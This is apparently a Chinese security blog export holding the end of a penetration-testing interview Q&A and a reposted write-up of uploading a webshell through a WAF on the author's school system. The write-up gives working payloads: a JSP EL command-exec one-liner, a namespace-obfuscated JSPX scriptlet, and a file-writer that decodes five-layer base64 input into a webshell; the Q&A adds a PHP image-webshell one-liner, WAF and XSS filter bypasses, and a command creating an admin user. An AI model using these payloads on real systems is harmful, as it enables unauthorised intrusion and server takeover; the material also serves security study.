<p>修改了哪个网站          就会想到要是你来攻击你会怎么入手  连接会用哪些工具（软件就有指纹）   就可以直接在日志中定位这个指纹   就可以第一时间找到攻击者攻击的数据包在哪</p>
<p><strong>四、追查</strong></p>
<p>日志分析、后门分析、流量分析、脚本软件分析、模拟渗透分析</p>
<p>参考链接：</p>
<p><a href="https://blog.csdn.net/qq_51577576/article/details/121582451">https://blog.csdn.net/qq_51577576/article/details/121582451</a></p>
<h2 id="5-如何处理勒索病毒，文件被加密，怎么处理呢？"><a href="#5-如何处理勒索病毒，文件被加密，怎么处理呢？" class="headerlink" title="5.如何处理勒索病毒，文件被加密，怎么处理呢？"></a>5.如何处理勒索病毒，文件被加密，怎么处理呢？</h2><ol>
<li>在网上查找有没有破解工具。如果是老款的勒索病毒，网上有可能可以找到加解密工具。</li>
</ol>
<p>这里注意一点，如果找到了解密工具，最好是先备份，再解密。</p>
<p>因为如果版本不一致，会解密失败，但同时文件底层扇区会进行相应的解密修改，导致后期就算找到一致的解密工具或解密秘钥，都是没办法再成功解密的，因为加密信息已经不一致了。</p>
<p>几个解密工具集下载地址：<br><a href="https://www.nomoreransom.org/zh/decryption-tools.html">No More Ransom</a></p>
<p>Emsisoft</p>
<p>卡巴斯基</p>
<p>MalwareHunterTeam</p>
<ol start="2">
<li><p>寻找专业团队进行恢复或修复</p>
</li>
<li><p>有些数据库可以恢复</p>
</li>
<li><p>等待解密工具出现</p>
</li>
</ol>
<h2 id="6-渗透测试流程"><a href="#6-渗透测试流程" class="headerlink" title="6.渗透测试流程"></a>6.渗透测试流程</h2><p><strong>目标确认–&gt;信息收集–&gt;漏洞发现–&gt;漏洞利用–&gt;权限维持&#x2F;内网渗透–&gt;目标获取&#x2F;痕迹清理</strong></p>
<h2 id="7-有没有复现过经典的漏洞"><a href="#7-有没有复现过经典的漏洞" class="headerlink" title="7.有没有复现过经典的漏洞"></a>7.有没有复现过经典的漏洞</h2><p>永恒之蓝、Apache Shiro、log4j rce</p>
<h2 id="8-谈谈-sql-注入"><a href="#8-谈谈-sql-注入" class="headerlink" title="8.谈谈 sql 注入"></a>8.谈谈 sql 注入</h2><blockquote>
<p> 含义、原理、条件、危害、防御、分类、利用、常用函数、绕waf等等的方面</p>
</blockquote>
<p><a href="https://fstraw.cn/posts/7b6ed634.html">https://fstraw.cn/posts/7b6ed634.html</a></p>
<h2 id="9-对数据库的了解讲一下"><a href="#9-对数据库的了解讲一下" class="headerlink" title="9.对数据库的了解讲一下"></a>9.对数据库的了解讲一下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mysql、MsSQL、Oracle、Access</span><br><span class="line"></span><br><span class="line">Access：是由微软发布的关联式数据库管理系统。小型数据库，当数据库达到100M左右的时候性能就会下降。数据库后缀名：.mdb。一般是asp的网页文件用access数据库</span><br><span class="line"></span><br><span class="line">SQL Server：1433：是一个比较大型的数据库。数据库后缀名 .mdf</span><br><span class="line"></span><br><span class="line">MySQL：3306：是一个关系型数据库管理系统。MySQL数据库大部分是php的页面。</span><br><span class="line"></span><br><span class="line">Oracle：1521：关系数据库管理系统。常用于比较大的网站。</span><br><span class="line"></span><br><span class="line">差异：</span><br><span class="line"></span><br><span class="line">成本上的差距：access是不要钱的，mysql也是开源的，sql server 是收费的一般也就几千，Oracle的费用则数万。</span><br><span class="line"></span><br><span class="line">处理能力：access支持千以内的访问量，sql server支持几千到上万的访问，而Oracle则支持海量的访问。</span><br><span class="line"></span><br><span class="line">数据库的规模：access是小型数据库，，mysql 是中小型数据库，sql server是中型数据库，Oracle是大型数据库。</span><br></pre></td></tr></table></figure>

<h2 id="10-预编译的原理"><a href="#10-预编译的原理" class="headerlink" title="10.预编译的原理"></a>10.预编译的原理</h2><p>在sql参数未注入之前,提前对sql语句进行预编译,后面注入的参数将不会再进行sql编译。即后面注入进来的参数系统将不会认为它会是一条SQL语句,而默认其是一个参数。</p>
<p>预编译是通过PreparedStatement和占位符来实现的</p>
<p>预编译防止不了排序处的注入。</p>
<p><a href="https://forum.butian.net/share/1559">https://forum.butian.net/share/1559</a></p>
<h2 id="11-phpinfo你会关注哪些信息"><a href="#11-phpinfo你会关注哪些信息" class="headerlink" title="11.phpinfo你会关注哪些信息"></a>11.phpinfo你会关注哪些信息</h2><ol>
<li>PHP版本、服务器信息、网站安装的绝对路径</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网站安装的绝对路径</span><br><span class="line">_SERVER[&quot;SCRIPT_FILENAME&quot;]</span><br><span class="line">真实IP</span><br><span class="line">_SERVER[&quot;SERVER_ADDR&quot;]</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>支持的程序  </p>
<p>比如redis、memcache，那么可以通过ssrf来getshell</p>
</li>
<li><p>GOPHER</p>
</li>
</ol>
<p>ssrf来getshell</p>
<ol start="4">
<li><p>数据库IP、用户名、密码</p>
</li>
<li><p>fastcgi</p>
</li>
</ol>
<p>查看是否开启fastcgi和fastcgi的版本，可能导致解析漏洞、远程命令执行、任意文件读取。</p>
<ol start="6">
<li>泄露缓存文件地址</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_FILE[&quot;file1&quot;]</span><br></pre></td></tr></table></figure>

<p>向phpinfo() post 一个shell可以在该位置看到上传的临时文件，如果有lfi，可以直接getshell</p>
<ol start="7">
<li>敏感配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_include</span><br><span class="line">远程文件包含</span><br><span class="line">allow_url_fopen</span><br><span class="line">disable_functions</span><br><span class="line">禁用函数，绕过执行</span><br><span class="line">open_basedir</span><br><span class="line">用p牛的绕过open_basedir的方法有可能读一些没权限的目录</span><br><span class="line">short_open_tag</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>环境信息</li>
</ol>
<p>如Environment中的path、log等</p>
<h2 id="12-有没有了解过权限维持"><a href="#12-有没有了解过权限维持" class="headerlink" title="12.有没有了解过权限维持"></a>12.有没有了解过权限维持</h2><p><a href="https://fstraw.cn/posts/8035962c.html">https://fstraw.cn/posts/8035962c.html</a></p>
<p><a href="https://fstraw.cn/posts/b0237af4.html">https://fstraw.cn/posts/b0237af4.html</a></p>
<h2 id="13-json格式的CSRF如何防御"><a href="#13-json格式的CSRF如何防御" class="headerlink" title="13.json格式的CSRF如何防御"></a>13.json格式的CSRF如何防御</h2><p>1)用户操作验证，在提交数据时需要输入验证码</p>
<p>2)请求来源验证，验证请求来源的referer</p>
<p>3)表单token验证</p>
<p>现在业界对CSRF的防御，一致的做法是使用一个Token(Anti CSRF Token)。</p>
<p>这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。</p>
<h2 id="14-fastjson相关漏洞"><a href="#14-fastjson相关漏洞" class="headerlink" title="14.fastjson相关漏洞"></a>14.fastjson相关漏洞</h2><ol>
<li>Fastjson&lt;1.2.24远程代码执行（CNVD-2017-02833 ）</li>
<li>Fastjson&lt;&#x3D;1.2.47远程代码执行漏洞（CNVD-2019-22238）</li>
<li>Fstjson &lt; 1.2.60 远程拒绝服务漏洞</li>
<li>Fastjson &lt;&#x3D;1.2.68 反序列化远程代码执行漏洞</li>
</ol>
<h2 id="15-说一个你知道的python相关的漏洞（SSTI原理，利用过程-payload相关的东西）"><a href="#15-说一个你知道的python相关的漏洞（SSTI原理，利用过程-payload相关的东西）" class="headerlink" title="15.说一个你知道的python相关的漏洞（SSTI原理，利用过程,payload相关的东西）"></a>15.说一个你知道的python相关的漏洞（SSTI原理，利用过程,payload相关的东西）</h2><h2 id="16-过滤limit后的逗号如何绕过"><a href="#16-过滤limit后的逗号如何绕过" class="headerlink" title="16.过滤limit后的逗号如何绕过"></a>16.过滤limit后的逗号如何绕过</h2><h2 id="17-浏览器解析顺序和解码顺序"><a href="#17-浏览器解析顺序和解码顺序" class="headerlink" title="17.浏览器解析顺序和解码顺序"></a>17.浏览器解析顺序和解码顺序</h2><h2 id="18-samesite防御CSRF的原理"><a href="#18-samesite防御CSRF的原理" class="headerlink" title="18.samesite防御CSRF的原理"></a>18.samesite防御CSRF的原理</h2><h2 id="19-信息收集如何处理子域名爆破的泛解析问题"><a href="#19-信息收集如何处理子域名爆破的泛解析问题" class="headerlink" title="19.信息收集如何处理子域名爆破的泛解析问题"></a>19.信息收集如何处理子域名爆破的泛解析问题</h2><p>目前最好的解决方式是通过先获取一个绝对不存在域名的响应内容，再遍历获取每个字典对应的子域名的响应内容，通过和不存在域名的内容做相似度比对，来枚举子域名，但这样的实现是以牺牲速度为代价</p>
<h2 id="20-你是怎么做资产搜集的"><a href="#20-你是怎么做资产搜集的" class="headerlink" title="20.你是怎么做资产搜集的"></a>20.你是怎么做资产搜集的</h2><p>Fofa、Goby、子域名在线收集。这些都没有收获的话，就会去扫一下C段，手工去收集一些比如公众号、小程序、app之类的信息。</p>
<h2 id="21-你对linux和windows的常用命令了解吗，如何查看linux的计划任务"><a href="#21-你对linux和windows的常用命令了解吗，如何查看linux的计划任务" class="headerlink" title="21. 你对linux和windows的常用命令了解吗，如何查看linux的计划任务"></a>21. 你对linux和windows的常用命令了解吗，如何查看linux的计划任务</h2><p><strong>Windows</strong>：</p>
<p>常用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 查看网络连接具体信息 netstat</span><br><span class="line">netstat -ano</span><br><span class="line">2. 查找本机ip的网络连接具体信息 find</span><br><span class="line">netstat -ano |find &quot;ip&quot;</span><br><span class="line">3. 创建用户</span><br><span class="line">net user 用户名 密码 /add</span><br><span class="line">4. 将用户加入到管理员组</span><br><span class="line">net local group administrators 用户名 /add</span><br><span class="line">5. 查看当前进程列表</span><br><span class="line">tasklist</span><br><span class="line">6. 杀死某个进程</span><br><span class="line">taskkill /PID</span><br><span class="line">7. 计划任务</span><br><span class="line">2003 以下版本 at</span><br><span class="line">2003 以上版本使用 schtask</span><br></pre></td></tr></table></figure>

<p><strong>Linux常用命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 查看系统所有的进程数据 </span><br><span class="line">ps aux </span><br><span class="line">2. 强制杀死某个进程</span><br><span class="line">kill -9 PID</span><br><span class="line">3. 判断文件的类型</span><br><span class="line">file filename</span><br><span class="line">4. tar</span><br><span class="line">压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称  </span><br><span class="line">查询：tar -jtv -f filename.tar.bz2  </span><br><span class="line">解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录  </span><br><span class="line">5. chgrp</span><br><span class="line">chgrp users -R ./dir # 递归地把dir目录下中的所有文件和子目录下所有文件的用户组修改为users </span><br><span class="line">6. chmod</span><br><span class="line">chmod 0755 file # 把file的文件权限改变为-rxwr-xr-x  </span><br><span class="line">chmod g+w file # 向file的文件权限中加入用户组可写权限 </span><br><span class="line">chmod +x file   # 给文件执行权限</span><br><span class="line">7. crontab命令选项</span><br><span class="line"># crontab -u</span><br><span class="line">-u指定一个用户</span><br><span class="line">-l列出某个用户的任务计划</span><br><span class="line">-r删除某个用户的任务</span><br><span class="line">-e编辑某个用户的任务</span><br></pre></td></tr></table></figure>

<p><strong>用户任务调度：</strong> 用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab文件都被保存在<code>/var/spool/cron</code>目录中。其文件名与用户名一致，使用者权限文件如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/cron.deny     该文件中所列用户不允许使用crontab命令</span><br><span class="line">/etc/cron.allow    该文件中所列用户允许使用crontab命令</span><br><span class="line">/var/spool/cron/   所有用户crontab文件存放的目录,以用户名命名</span><br></pre></td></tr></table></figure>

<p> cat &#x2F;etc&#x2F;crontab 查看</p>
<h2 id="22-挖到过逻辑漏洞吗"><a href="#22-挖到过逻辑漏洞吗" class="headerlink" title="22.挖到过逻辑漏洞吗"></a>22.挖到过逻辑漏洞吗</h2><p>逻辑漏洞挖到过很多，比如支付金额修改、用户名枚举、短信轰炸、验证码绕过</p>
<h2 id="23-挖到过框架漏洞吗"><a href="#23-挖到过框架漏洞吗" class="headerlink" title="23.挖到过框架漏洞吗"></a>23.挖到过框架漏洞吗</h2><p>没有</p>
<h2 id="24-讲一下宽字节注入"><a href="#24-讲一下宽字节注入" class="headerlink" title="24.讲一下宽字节注入"></a>24.讲一下宽字节注入</h2><p>当某字符的大小为两个字节时，称其字符为宽字节</p>
<p>数据库使用的的是GBK编码而PHP编码为UTF8，%df%27或%81%27数据为空，%27的url解码为单引号 <code>‘</code>，所以php为给引号增加一个转义字符 <code>\</code>,而转义字符的url编码为<code>%5c</code>和前面的%df结合<strong>就组成了一个新的字符，准确的说是一个汉字</strong></p>
<p>就是说客户端发送的数据编码为gbk时，那么可能会吃掉转义字符\反斜杠，闭合之后页面恢复正常，存在宽字节注入</p>
<h2 id="25-你绕过waf吗，怎么做的"><a href="#25-你绕过waf吗，怎么做的" class="headerlink" title="25.你绕过waf吗，怎么做的"></a>25.你绕过waf吗，怎么做的</h2><p>绕过waf的方式有很多，简单绕过是 大小写</p>
<p>特殊字符替换空格或注释绕过：union select 1,2<code>可转换为</code>union&#x2F;<em>xx</em>&#x2F;select&#x2F;<em>xx</em>&#x2F;1,2</p>
<p>编码绕过：少数waf不会对普通字符进行URL解码,还有一部分waf只会进行一次url解码，所以可以对payload进行二次url编码。常见的SQL编码有unicode、HEX、URL、ascii、base64等，<a href="https://so.csdn.net/so/search?q=XSS&spm=1001.2101.3001.7020">XSS</a>编码有：HTML、URL、ASCII、JS编码、base64等等。</p>
<p>关键字替换绕过：也就是在关键字内部复写</p>
<p>多请求拆分绕过：对于多个参数的语句，可以将注入语句分割插入。<br>如这样的请求：<code>?a=[inputa]&amp;b=[inputb]</code>可将参数a和b拼接如：<code>and a=[inputa] and b=[inputb]</code></p>
<p>利用cookies绕过、云WAF绕过之寻找网站源ip</p>
<p>还有发送大量垃圾数据绕过，条件竞争让waf处理不了。</p>
<h2 id="26-说一下nmap的默认扫描方式"><a href="#26-说一下nmap的默认扫描方式" class="headerlink" title="26.说一下nmap的默认扫描方式"></a>26.说一下nmap的默认扫描方式</h2><p>-sS 执行半开扫描，不完成TCP握手流程。只向目标端口发送一个SYN报文，然后等待响应。SYN&#x2F;ACK表示端口在监听 (开放)，而 RST (复位)表示没有监听者。如果多次重发后仍没响应， 该端口就被标记为被过滤。</p>
<h2 id="27-说一下xss、csrf和ssrf的区别"><a href="#27-说一下xss、csrf和ssrf的区别" class="headerlink" title="27.说一下xss、csrf和ssrf的区别"></a>27.说一下xss、csrf和ssrf的区别</h2><p>XSS和CSRF的相同点，它们都是利用<strong>浏览器</strong>发送数据包，而SSRF是在<strong>服务器</strong>上执行让<strong>服务器</strong>偷偷发送数据包；另外，CSRF和XSS都会利用到Cookie，但CSRF是利用它让浏览器偷偷发送数据包，而XSS是直接窃取Cookie。</p>
<p>csrf 存在的原因一般都可以是因为表单没有token参数校验。</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容,加载指定地址的图片,文档,等等。</p>
<p>csrf 一般可以结合 xss 进行攻击。</p>
<p>ssrf 一般可以结合 内网的redis、log4j等大规模存在的漏洞进行攻击</p>
<h2 id="28-说一下CSRF的适用场合"><a href="#28-说一下CSRF的适用场合" class="headerlink" title="28.说一下CSRF的适用场合"></a>28.说一下CSRF的适用场合</h2><p>一般适用于后台的密码修改、用户权限提升，用户添加等。</p>
<h2 id="29-说一下XSS的绕过方式"><a href="#29-说一下XSS的绕过方式" class="headerlink" title="29.说一下XSS的绕过方式"></a>29.说一下XSS的绕过方式</h2><ol>
<li>大小写绕过</li>
<li>空格&#x2F;回车（换行符）&#x2F;Tab</li>
<li><strong>堆叠绕过</strong></li>
</ol>
<p>类似于 输出为 为变量$str</p>
<p>$str2&#x3D;str_replace(“script”,””,$str);<br>$str3&#x3D;str_replace(“on”,””,$str2);<br>$str4&#x3D;str_replace(“src”,””,$str3);<br>$str5&#x3D;str_replace(“data”,””,$str4);<br>$str6&#x3D;str_replace(“href”,””,$str5);<br> 可以采用oonn避开过滤 机制是吧中间的on过滤了</p>
<ol start="4">
<li><strong>事件绕过</strong></li>
</ol>
<p>就是加入一些事件 此方法可绕过大部分SRC域名过滤器，它允许将事件替换为任何标签中可用的事件类型，例如onblur,onclick</p>
<ol start="5">
<li><strong>伪协议绕过</strong></li>
</ol>
<p>利用 在a标签里插入 javascript:  伪协议</p>
<ol start="6">
<li><strong>前端抓包绕过</strong></li>
</ol>
<p>可修改，可以编码抓包绕过</p>
<ol start="7">
<li>html5新标签绕过</li>
</ol>
<h2 id="30-说一下文件上传的绕过方式"><a href="#30-说一下文件上传的绕过方式" class="headerlink" title="30.说一下文件上传的绕过方式"></a>30.说一下文件上传的绕过方式</h2><p>修改文件名后缀</p>
<p>图片一句话木马</p>
<p>htaccess文件绕过上传</p>
<p>IIS6.0 解析漏洞</p>
<p>编辑器漏洞</p>
<p>IIS高版本上传–畸形解析漏洞</p>
<p>aspx漏洞</p>
<p>双写filename绕过waf</p>
<p>目录穿越</p>
<p><a href="https://fstraw.cn/posts/b96d5de5.html">https://fstraw.cn/posts/b96d5de5.html</a></p>
<h2 id="31-怎么合成图片马"><a href="#31-怎么合成图片马" class="headerlink" title="31.怎么合成图片马"></a>31.怎么合成图片马</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy mm.jpg/b+ma01.php/a mm-ma01.jpg</span><br></pre></td></tr></table></figure>

<p>也可以加上图片标识头，改为gif后缀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php assert($_POST[whuctf]); ?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="32-你遇到过竞争条件吗"><a href="#32-你遇到过竞争条件吗" class="headerlink" title="32.你遇到过竞争条件吗"></a>32.你遇到过竞争条件吗</h2><p>验证码发送，短信爆破</p>
<h2 id="33-你对log4j有什么理解"><a href="#33-你对log4j有什么理解" class="headerlink" title="33.你对log4j有什么理解"></a>33.你对log4j有什么理解</h2><h2 id="其他题目"><a href="#其他题目" class="headerlink" title="其他题目"></a>其他题目</h2><p><a href="https://mp.weixin.qq.com/s/dd3Mi7T8hF70t2MtmyDOTA">https://mp.weixin.qq.com/s/dd3Mi7T8hF70t2MtmyDOTA</a></p>
<h2 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h2>]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次绕过waf的任意文件上传</title>
    <url>/posts/63996aa.html</url>
    <content><![CDATA[<blockquote>
<p>推荐：绕过了深信服 waf 实现文件上传，正斜杠绕过文件名检测，使用 jspx 命名空间绕过内容检测，获取网站路径，最后加密写入 webshell。绕过waf是现在文件上传的常态了。</p>
<p>转载自：<strong><a href="https://xz.aliyun.com/t/11337">https://xz.aliyun.com/t/11337</a></strong></p>
</blockquote>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>前几天对自己学校进行的一次渗透测试，由于深信服过于变态，而且拦截会直接封ip，整个过程有点曲折</p>
<p>期间进行了后缀名绕过，jspx命名空间绕过、获取网站根目录、base64五层编码写入shell等操作</p>
<h1 id="0x01-获取网站接口"><a href="#0x01-获取网站接口" class="headerlink" title="0x01 获取网站接口"></a><strong>0x01 获取网站接口</strong></h1><p>主界面:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640.png" alt="图片"></p>
<p>上传点:</p>
<p>由于该应用是内嵌企业微信的套皮Html，所以我们首先用Burp Suite抓包获取接口和cookie</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789341917.png" alt="图片"></p>
<p>任意文件上传:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342018.png" alt="图片"></p>
<p>文件名强制命名为code+学号，后缀为最后一次点号出现之后的字母</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="0x02-后缀名绕过"><a href="#0x02-后缀名绕过" class="headerlink" title="0x02 后缀名绕过"></a><strong>0x02 后缀名绕过</strong></h1><p>代码不限制后缀名，但是waf限制呀！</p>
<p>后缀名jsp，jspx会拦截，但是jspp，jspxx等不会拦截</p>
<p>所以要利用windows特性绕过，常规的绕过手法例如末尾加点号、::$DATA均无法绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342019.jpeg" alt="图片"></p>
<p>经过fuzz，发现正斜杠可以绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342020.png" alt="图片"></p>
<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h1 id="0x03-内容绕过"><a href="#0x03-内容绕过" class="headerlink" title="0x03 内容绕过"></a><strong>0x03 内容绕过</strong></h1><p>常见的jsp标记均无法绕过</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342021.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342022.png" alt="图片"></p>
<p>所以我们得绕过JSP标记检测，这里参考了yzddmr6师傅的两种 <strong>绕过方法</strong>：</p>
<ul>
<li>jspEL表达式绕过</li>
<li>jspx命名空间绕过</li>
</ul>
<p><strong>第一种是利用${}标记</strong>：</p>
<p>payload：${Runtime.getRuntime().exec(request.getParameter(“x”))}</p>
<p>但深信服waf过滤了一句话，需要变形绕过</p>
<p>鄙人太菜了，不了解相关函数的变形绕过，所以选择第二种写法</p>
<p><strong>第二种是利用命名空间的特性</strong>：</p>
<p>参照yzddmr6师傅的图：</p>
<p>使用自定义的命名空间，替换掉jsp的关键字</p>
<p>将原本的<a href="jsp:scriptlet">jsp:scriptlet</a>替换成&lt;自定义字符:scriptlet&gt;</p>
<p>这样waf的正则匹配不到<a href="jsp:scriptlet">jsp:scriptlet</a>自然就会放行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;hi xmlns:hi=&quot;http://java.sun.com/JSP/Page&quot;&gt;</span><br><span class="line">    &lt;hi:scriptlet&gt;</span><br><span class="line">        out.println(30*30);</span><br><span class="line">    &lt;/hi:scriptlet&gt;</span><br><span class="line">&lt;/hi&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342123.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342124.jpeg" alt="图片"></p>
<h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><h1 id="0x04-获取网站路径"><a href="#0x04-获取网站路径" class="headerlink" title="0x04 获取网站路径"></a><strong>0x04 获取网站路径</strong></h1><p>这里我们不能用相对路径来写入webshell</p>
<p>因为Tomcat与Apache不同，根目录并不是以代码运行位置决定所在的目录，而是默认为Tomcat&#x2F;bin作为根目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取当前的根目录</span><br><span class="line">String path = System.getProperty(&quot;user.dir&quot;);</span><br><span class="line">out.println(path);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342125.jpeg" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取web项目所在的目录</span><br><span class="line">String path = application.getRealPath(&quot;test.jsp&quot;);</span><br><span class="line">out.println(path);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87waf%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/640-166417789342126.jpeg" alt="图片"></p>
<p>所以写入shell的绝对路径应为D:&#x2F;tomcat8&#x2F;webapps&#x2F;declare&#x2F;static&#x2F;upload&#x2F;test.jsp</p>
<h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><h1 id="0x05-编码或加密绕过waf写入shell"><a href="#0x05-编码或加密绕过waf写入shell" class="headerlink" title="0x05 编码或加密绕过waf写入shell"></a><strong>0x05 编码或加密绕过waf写入shell</strong></h1><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;hi xmlns:hi=&quot;http://java.sun.com/JSP/Page&quot;&gt;</span><br><span class="line">    &lt;hi:directive.page import=&quot;java.util.Base64,java.io.*&quot;/&gt;</span><br><span class="line">    &lt;hi:scriptlet&gt;</span><br><span class="line">        File file = new File(&quot;D:/tomcat8/webapps/declare/static/upload/test.jsp&quot;);</span><br><span class="line">        FileWriter fileOut = new FileWriter(file);</span><br><span class="line">        Base64.Decoder base64 = Base64.getDecoder();</span><br><span class="line">        byte[] str = base64.decode(base64.decode(base64.decode(base64.decode(base64.decode(request.getParameter(&quot;x&quot;).getBytes(&quot;utf-8&quot;))))));</span><br><span class="line">        try &#123;</span><br><span class="line">            fileOut.write(new String(str, &quot;utf-8&quot;));</span><br><span class="line">            out.println(&quot;写入成功&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                if (fileOut != null) &#123;</span><br><span class="line">                    fileOut.close();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/hi:scriptlet&gt;</span><br><span class="line">&lt;/hi&gt;</span><br></pre></td></tr></table></figure>

<p>一开始我是用两层base64编码，还是被检测了，经过fuzz发现五层编码即可绕过</p>
<p>鄙人太懒了，不想重新造轮子。如果各位师傅有时间的话，遇到这种waf建议用RSA、AES等加密算法绕过</p>
